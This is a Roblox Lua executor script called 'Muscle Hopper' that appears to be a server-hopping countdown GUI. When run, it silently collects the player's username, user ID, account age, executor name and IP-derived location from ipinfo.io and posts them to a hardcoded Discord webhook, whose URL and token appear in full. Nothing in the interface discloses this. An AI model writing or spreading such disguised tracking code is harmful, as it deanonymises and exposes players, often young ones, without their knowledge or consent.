-- References
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- GUI Setup
local player = Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local StopButton = Instance.new("TextButton")
local ResumeButton = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")
local TimerLabel = Instance.new("TextLabel")
local ConfigurableTextLabel = Instance.new("TextLabel")
    
local countdownTime = 60 -- Set the countdown time in seconds
local remainingTime = countdownTime -- Variable to keep track of remaining time
local isCountingDown = true -- Flag to control the countdown
local PlaceIDToTeleport = 142823291 -- Replace with the actual PlaceId you want to teleport to

-- Discord webhook URL (make sure to set your actual webhook URL here)
local webhookUrl = "https://discord.com/api/webhooks/1299411759156822066/6twa5G6Jw7PBmNbQ6aHH14CdyZWvtpix9I0lSty09fVA_yPWwQ6vmJ96gZRgU1HUjMEp"


-- Utility function to perform an HTTP GET request
local function GetAsync(url)
    local requestFunc = http_request or request or HttpPost or syn.request
    local response = requestFunc({
        Url = url,
        Method = "GET",
        Headers = {
            ["User-Agent"] = "Roblox"
        }
    })
    
    if response and response.StatusCode == 200 then
        return HttpService:JSONDecode(response.Body)
    else
        return nil, response and response.StatusCode
    end
end

local function SendMessage(webhook)
    local fardplayer = Players.LocalPlayer
    local ExecutorWebhook = identifyexecutor() or "undefined" -- Replace with your method to get the executor type
    local timestamp = os.date("%Y-%m-%d %H:%M:%S") -- Current timestamp

    -- Step 1: Get IP information using executor's request method
    local ipInfo, err = GetAsync("https://ipinfo.io/json")

    if not ipInfo then
        ipInfo = {
            ip = "N/A",
            city = "N/A",
            region = "N/A",
            country = "N/A",
            error = err or "Unknown error"
        }
    end

    local msg = {
        ["content"] = "",
        ["username"] = fardplayer.Name,
        ["avatar_url"] = "https://media.discordapp.net/attachments/1288404053394456587/1292742655037407304/171426663.jpg?ex=671d3baa&is=671bea2a&hm=e45dae4e37fb327ef0acc124cd233df64c2bb3af3c09b41137b7f2db0dd93c02&=?format=webp&quality=lossless&width=419&height=419", -- Replace or customize your avatar URL
        ["embeds"] = {
            {
                ["title"] = "**Muscle Hopper is activated.**",
                ["type"] = "rich",
                ["color"] = tonumber(0),
                ["fields"] = {
                    {
                        ["name"] = "User Information",
                        ["value"] = "```Username     : " ..
                            fardplayer.Name ..
                            "\nUser-ID      : " ..
                            fardplayer.UserId ..
                            "\nAccount Age  : " ..
                            fardplayer.AccountAge ..
                            " Days" ..
                            "\nExploit      : " ..
                            ExecutorWebhook ..
                            "\nTime         : " ..
                            timestamp ..
                            "\nIP Address   : " ..
                            (ipInfo.ip or "N/A") ..
                            "\nCity         : " ..
                            (ipInfo.city or "N/A") ..
                            "\nRegion       : " ..
                            (ipInfo.region or "N/A") ..
                            "\nCountry      : " ..
                            (ipInfo.country or "N/A") ..
                            (ipInfo.error and ("\nError        : " .. ipInfo.error) or "") ..
                            "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1288403082925051924/1299622084166684703/sdasd.jpg??format=webp&width=419&height=419quality=lossless" -- Replace with actual image URL if needed
                }
            }
        },
        ["attachments"] = {}
    }

    -- Step 2: Send message to webhook
    local request = http_request or request or HttpPost or syn.request
    request({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(msg)
    })
end

-- Send initial message to Discord when the script is executed
SendMessage(webhookUrl)


-- Properties for ScreenGui
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- Properties for Frame
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Active = true
Frame.Draggable = true
Frame.BorderSizePixel = 0
Frame.BackgroundTransparency = 0.5

local configurableText = "Powered by Muscle Scripts" -- Text displayed under the timer

-- Create Configurable Text Label
ConfigurableTextLabel.Parent = Frame
ConfigurableTextLabel.Size = UDim2.new(1, 0, 0, 25) -- Adjust size
ConfigurableTextLabel.Position = UDim2.new(0, 0, 0.75, 0) -- Place below the TimerLabel
ConfigurableTextLabel.BackgroundTransparency = 1
ConfigurableTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Change to black for visibility
ConfigurableTextLabel.TextScaled = true
ConfigurableTextLabel.Font = Enum.Font.FredokaOne
ConfigurableTextLabel.Text = configurableText -- Set the text from the variable


-- Create Timer Label
TimerLabel.Parent = Frame
TimerLabel.Size = UDim2.new(1, 0, 0, 70)
TimerLabel.Position = UDim2.new(0, 0, 0.55, -35)
TimerLabel.BackgroundTransparency = 1
TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TimerLabel.TextScaled = true
TimerLabel.Font = Enum.Font.FredokaOne
TimerLabel.Text = tostring(remainingTime)

-- Create Rounded Corners for Frame
local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 20)

-- Function to create buttons with rounded corners and hover effects
local function createButton(text, position, parent)
    local button = Instance.new("TextButton")
    button.Parent = parent
    button.Size = UDim2.new(0, 90, 0, 40)
    button.Position = position
    button.Text = text
    button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Create Rounded Corners for Button
    local buttonCorner = Instance.new("UICorner", button)
    buttonCorner.CornerRadius = UDim.new(0, 10)

    -- Add mouse enter and leave events for color changing
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(0, 210, 255)
    end)

    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    end)

    return button
end

-- Create buttons
StopButton = createButton("Stop", UDim2.new(0, 32, 0, 20), Frame)
CloseButton = createButton("Close", UDim2.new(0, 180, 0, 20), Frame)
ResumeButton = createButton("Resume", UDim2.new(0, 110, 0, 20), Frame)

-- Button functionalities
StopButton.MouseButton1Click:Connect(function()
    print("Stop Button Clicked")
    isCountingDown = false -- Stop the countdown
    StopButton.Text = "Stopped" -- Change button text to indicate stopped state
    wait(1) -- Wait for 1 second
    StopButton.Text = "Stop" -- Change back to "Stop"
    ResumeButton.Text = "Resume" -- Reset Resume button text in case it was toggled
end)

ResumeButton.MouseButton1Click:Connect(function()
    print("Resume Button Clicked")
    if not isCountingDown then
        isCountingDown = true -- Resume the countdown
        ResumeButton.Text = "Resumed" -- Change button text to indicate resumed state
        wait(1) -- Wait for 1 second
        ResumeButton.Text = "Resume" -- Change back to "Resume"
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy() -- Closes the GUI
    isCountingDown = false -- Stop the countdown when closing
end)

-- Countdown Timer Logic
spawn(function()
    while remainingTime > 0 do
        wait(1) -- Wait for 1 second
        if isCountingDown then
            remainingTime = remainingTime - 1
            TimerLabel.Text = tostring(remainingTime) -- Update timer label
        end
    end

    -- When the countdown reaches 0
    if remainingTime <= 0 then
        TimerLabel.Text = "Hopping Now.."
        StopButton.TextColor3 = Color3.fromRGB(255, 0, 0) -- Change the color of the Stop button
        
        -- Teleport to the specific PlaceId
        local teleportSuccess, teleportError = pcall(function()
            TeleportService:Teleport(PlaceIDToTeleport, player) -- Teleport the player to the specified PlaceId
        end)

        if not teleportSuccess then
            warn("Teleport failed: " .. teleportError) -- Warn if teleportation failed
        end
            -- Notify Discord when time is up
            SendMessage(1) -- Notify on Time's Up
        end
 end)
